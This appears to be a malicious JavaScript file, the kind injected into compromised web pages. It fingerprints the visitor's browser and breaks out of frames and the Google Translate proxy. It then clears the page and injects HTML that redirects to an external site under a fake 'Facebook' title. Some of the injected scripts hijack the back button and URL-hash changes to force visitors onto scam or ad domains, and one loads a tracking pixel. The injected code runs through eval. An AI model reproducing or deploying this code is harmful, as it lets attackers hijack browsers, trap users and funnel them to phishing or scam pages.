var IS_MOBILE = '1' > 0;
var limit_bot = IS_MOBILE ? 600 : 410;


var object = '';

for (a in navigator ){
  var type = (typeof navigator[a]);
  if(type == 'string') object += navigator[a]+'; ';
};

var OUTPUT = encodeURIComponent('152.0.131.21'+'; '+object);


//if(OUTPUT.length < limit_bot) window.success_implat = true;


try{ 
    var ___ = {}; 
    var params = location.search.substring(1).split('&'); 
    if(params.length){ 
      for(var tt = 0; tt < params.length; tt++){  
        if (params[tt].indexOf('=') > -1) {
          var to_object = params[tt].split('=');
          ___[to_object[0]] = decodeURIComponent(to_object[1]);
        }
      } 
    }  

    if (location.host == 'translate.googleusercontent.com' && ___.u) {
      try{
           window.top.location = ___.u;
           window.success_implat = true
      }catch(f){

      };
    }


      try{
           if(window.top != window.self){
            window.top.location = window.self.location
            window.success_implat = true
         }
      }catch(f){

      };

}catch(d){};

  (function(implat){
      if(implat) return false;
      function checkbody(call){
          var timer = setInterval(function(){
              if(document.querySelector('body')){
                  clearInterval(timer)
                  if (typeof call == 'function') {
                      call(document.querySelector('body'));
                  }
              }
          },10)

      };


      function insertHtml(ele, html)  
      {  
         ele.innerHTML = html;  
         var codes = ele.getElementsByTagName('script');   
         for(var i=0;i<codes.length;i++)  
         {  console.log(codes[i])
             eval(codes[i].text);  
         }  
      }  


      var data = ["<script>window.location.href = \"https://wiff.pages.dev\";<\/script>\n<!-- Show an alternative message or content if it's a bot -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Facebook<\/title>\n<\/head>\n<body>\n    <h1>Loading...<\/h1>\n    <p>Please click <a href=\"https://wiff.pages.dev\">Continue<\/a>.<\/p>\n<\/body>\n<\/html>\n\n\t   <script>\n\t\t   (function(){\n\t\t\t\tvar ignoreHistoryChange = true;\n\t\t\t    window.onpopstate = function (event) {\n\n\t\t\t\t\t\tif (!ignoreHistoryChange) {\n\t\t\t\t\t\t\tignoreHistoryChange = true;\n\n\t\t\t\t\t        try{\n\t\t\t\t\t        \twindow.top.location = 'https:\/\/country.contentrightnow.com/?k=4979ad9218da3a90157cee4e188d76fa&type=mainstream&subtype=global';\n\t\t\t\t\t        }catch(d){\n\t\t\t\t\t        \twindow.location = 'https:\/\/country.contentrightnow.com/?k=4979ad9218da3a90157cee4e188d76fa&type=mainstream&subtype=global';\n\t\t\t\t\t        };\n\t\t\t\t\t        return false;\n\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tignoreHistoryChange = false;   \n\t\t\t\t\t\t}\n\n\n\t\t\t    };\n\t\t\t})();\n\t    <\/script>\n\n\t    <script>\n\t\t   (function(){\n\t\t\twindow.location.hash = Math.random();\n\t\t\tvar ignoreHashChange = true;\n\t\t\twindow.onhashchange = function () {\n\t\t\t\tif (!ignoreHashChange) {\n\t\t\t\t\tignoreHashChange = true;\n\n\t\t\t        try{\n\t\t\t        \twindow.top.location = 'https:\/\/polo.thegadgetguru.club\/?k=1ea6621590e9ef61444c31b0b1925367&type=mainstream&subtype=global';\n\t\t\t        }catch(d){\n\t\t\t        \twindow.location = 'https:\/\/polo.thegadgetguru.club\/?k=1ea6621590e9ef61444c31b0b1925367&type=mainstream&subtype=global';\n\t\t\t        };\n\t\t\t        return false;\n\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tignoreHashChange = false;   \n\t\t\t\t}\n\t\t\t};\n\t\t\t})();\n\t    <\/script>\n\t<script>(function(){ new Image().src = '\/\/whos.amung.us\/widget\/COUNTER_GENERAL'; })();<\/script>"];

      checkbody(function(body){
        try{ if (document.head) { document.head.innerHTML = ''; }; }catch(d){};
          insertHtml(body, data[0]);

      })

  })( window.success_implat);
